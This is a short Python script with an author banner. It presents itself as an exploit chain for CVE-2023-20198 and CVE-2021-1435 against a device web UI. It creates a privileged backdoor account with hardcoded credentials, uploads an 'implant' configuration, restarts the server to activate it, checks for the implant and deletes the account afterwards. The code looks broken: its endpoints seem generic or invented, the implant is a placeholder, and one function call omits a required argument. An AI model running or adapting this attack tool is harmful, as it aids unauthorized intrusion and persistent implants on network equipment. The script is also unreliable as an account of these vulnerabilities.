import requests


# About
print(r"""
            _           _ _                  
           | |         (_) |                 
  ___  ___ | |__  _____ _| |__   _____ _   _ 
 /___)/ _ \|  _ \(____ | |  _ \ | ___ | | | |
|___ | |_| | | | / ___ | | |_) )| ____| |_| |
(___/ \___/|_| |_\_____|_|____(_)_____)____/ 
                                                                                             
 21 - 10 - 2023               info@sohaib.eu
""")


# Define functions for making POST and GET requests
def send_post_request(url, data, verify=False):
    response = requests.post(url, data=data, verify=verify)
    return response

def send_get_request(url, verify=False):
    response = requests.get(url, verify=verify)
    return response

# Set the base URL and user credentials
base_url = "https://target.com/webui"
username = "superuser"
password = "E1337h@x0r"
config_content = "<insert implant configuration content here>"

# CVE-2023-20198 exploition to create a local user account
create_user_url = f"{base_url}/create_user"
user_payload = {"username": username, "password": password}
response = send_post_request(create_user_url, user_payload)

# Check if the user account creation was successful
if response.status_code == 200:
    print(f"User account created: {username}")

# CVE-2021-1435 exploition to install the implant
install_url = f"{base_url}/cisco_service.conf"
config_payload = {"config_content": config_content}
response = send_post_request(install_url, config_payload)

# Check if the implant installation was successful
if response.status_code == 200:
    print("Implant installed successfully")

# Restart the web server to activate the implant
restart_url = f"{base_url}/restart_server"
response = send_post_request(restart_url)

# Check if the web server restart was successful
if response.status_code == 200:
    print("Web server restarted. Implant is active")

# Check for the presence of the implant
check_url = f"{base_url}/implant_status"
response = send_get_request(check_url)

# Check if the implant is present by examining the response text
if response.status_code == 200 and "implant" in response.text:
    print("Implant is present")
else:
    print("Implant is not present")

# Clean up by deleting the local user account
delete_user_url = f"{base_url}/delete_user/{username}"
response = requests.delete(delete_user_url, verify=False)

# Check if the user account deletion was successful
if response.status_code == 200:
    print(f"User account deleted: {username}")